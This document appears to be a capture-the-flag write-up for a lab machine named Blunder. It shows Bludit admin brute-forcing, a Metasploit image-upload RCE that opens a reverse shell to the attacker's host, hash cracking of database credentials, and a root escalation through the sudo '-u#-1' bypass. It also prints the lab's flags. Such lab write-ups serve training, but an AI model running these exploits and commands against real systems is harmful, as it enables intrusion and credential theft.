# Blunder

## SYN Scan
```
nmap -sS -sV -O -p- -v -Pn -T4 -oA nmap/full_syn 10.10.10.191

PORT   STATE  SERVICE VERSION
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
```

## Bludit
```
$ curl http://10.10.10.191/install.php                   
Bludit is already installed ;)
```

### Version Detection
Blundit version is `3.9.2`.
```
!-- Include Bootstrap CSS file bootstrap.css -->
<link rel="stylesheet" type="text/css" href="http://10.10.10.191/bl-kernel/css/bootstrap.min.css?version=3.9.2">

<!-- Include CSS Styles from this theme -->
<link rel="stylesheet" type="text/css" href="http://10.10.10.191/bl-themes/blogx/css/style.css?version=3.9.2">
```

### Bludit v3.10.0 "Mateo" Changelog
https://github.com/bludit/bludit/releases/tag/3.10.0a
```
...
Fixed security vulnerability for Code Execution Vulnerability in "Images Upload. #1079
Fixed security vulnerability for Code Execution Vulnerability in "Upload function". #1081
Fixed security vulnerability to store Javascript code on categories fields and user profile fields.
Fixed security vulnerability for Bypass brute force protection. Thanks to @rastating for report it and fixed it.
...
```

### Related Topics
https://www.cvedetails.com/cve/CVE-2019-16113/

https://nvd.nist.gov/vuln/detail/CVE-2019-16113

https://www.exploit-db.com/exploits/47699

## Admin Credentials via Brute Force
```
fergus: RolandDeschain
```

## RCE via Image Upload
Bludit version `3.9.2` is vulnerable to remote code execution because of weak image upload feature.

### Related Topics
https://www.cvedetails.com/cve/CVE-2019-16113/

https://nvd.nist.gov/vuln/detail/CVE-2019-16113

https://www.exploit-db.com/exploits/47699

```
msf6 exploit(linux/http/bludit_upload_images_exec) > exploit

[*] Started reverse TCP handler on 10.10.14.33:4444 
[+] Logged in as: fergus
[*] Retrieving UUID...
[*] Uploading LgMMYgervf.png...
[*] Uploading .htaccess...
[*] Executing LgMMYgervf.png...
[*] Sending stage (39282 bytes) to 10.10.10.191
[+] Deleted .htaccess
[*] Meterpreter session 1 opened (10.10.14.33:4444 -> 10.10.10.191:57718) at 2021-04-01 22:12:21 +0300

meterpreter > getuid
Server username: www-data (33)
```

## Custom FTP folder
```
pwd
/ftp
ls -l
total 10920
-rw-r--r-- 1 root root 10899227 Nov 27  2019 D5100_EN.pdf
-rw-r--r-- 1 root root   271056 Nov 27  2019 config
-rw-r--r-- 1 root root      828 Nov 27  2019 config.json
-rw-r--r-- 1 root root      260 Nov 27  2019 note.txt
```

### note.txt
```
Hey Sophie
I've left the thing you're looking for in here for you to continue my work
when I leave. The other thing is the same although Ive left it elsewhere too.

Its using the method we talked about; dont leave it on a post-it note this time!

Thanks
Shaun
```

## Local User Enumeration
```
...
shaun:x:1000:1000:blunder,,,:/home/shaun:/bin/bash
hugo:x:1001:1001:Hugo,1337,07,08,09:/home/hugo:/bin/bash
...
```

## Hugo's DB Credentials
```
(remote) www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.php 
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}
}
```

## Administrator's DB Credentials
Hash format: `sha1(pass.salt)`
```
hugo@blunder:/var/www/bludit-3.9.2/bl-content$ cat databases/users.php 
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Admin",
        "firstName": "Administrator",
        "lastName": "",
        "role": "admin",
        "password": "bfcc887f62e36ea019e3295aafb8a3885966e265",
        "salt": "5dde2887e7aca",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""
    },
```

## Wordlist Attack Using Hashcat
Used rockyou + best64 rule to crack the SHA1 hashes.

```
Hugo
faca404fd5c0a31cf1897b823c695c85cffeb98d:Password120

Administrator
bfcc887f62e36ea019e3295aafb8a3885966e265:5dde2887e7aca:casablancas1
```

Used `Password120` to login as hugo.

## Privilege Escalation #1
```
hugo@blunder:/var/www/html$ id
uid=1001(hugo) gid=1001(hugo) groups=1001(hugo)
```

## The User Flag
```
hugo@blunder:~$ ls -l user.txt
-r-------- 1 hugo hugo 33 Mar 31 23:28 user.txt
```

```
60bf4cbc1135901bb2a884c80c962bc4
```

## Privilege Escalation #2
`hugo` user can execute `/bin/bash` as another user (but those who are not in root group).
```
hugo@blunder:/dev/shm$ sudo -l
Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
```

```
hugo@blunder:/dev/shm$ sudo -H -u shaun /bin/bash
```

```
shaun@blunder:/dev/shm$ id
uid=1000(shaun) gid=1000(shaun) groups=1000(shaun),4(adm),24(cdrom),30(dip),46(plugdev),119(lpadmin),130(lxd),131(sambashare)
```

## Privilege Escalation #3 via Vulnerable sudo version
Sudo version `1.8.25p1`.

The vulnerability in a sudo security policy bypass issue that could allow a malicious user or a program to
execute arbitrary commands as root on a targeted Linux system even when the "sudoers configuration" explicitly
disallows the root access.

### The Restriction
```
(ALL, !root) /bin/bash
```

CVE-2019-14287 => https://nvd.nist.gov/vuln/detail/CVE-2019-14287

```
(remote) hugo@blunder:/dev/shm$ sudo -u#-1 bash
Password: 
root@blunder:/dev/shm# id
uid=0(root) gid=1001(hugo) groups=1001(hugo)
```

# The Root Flag
```
root@blunder:/dev/shm# cd /root
root@blunder:/root# ls -l
total 4
-r-------- 1 root root 33 Mar 31 23:28 root.txt
```

```
root@blunder:/root# cat root.txt 
e7e3042135546d6a22cffbfe125ba415
```
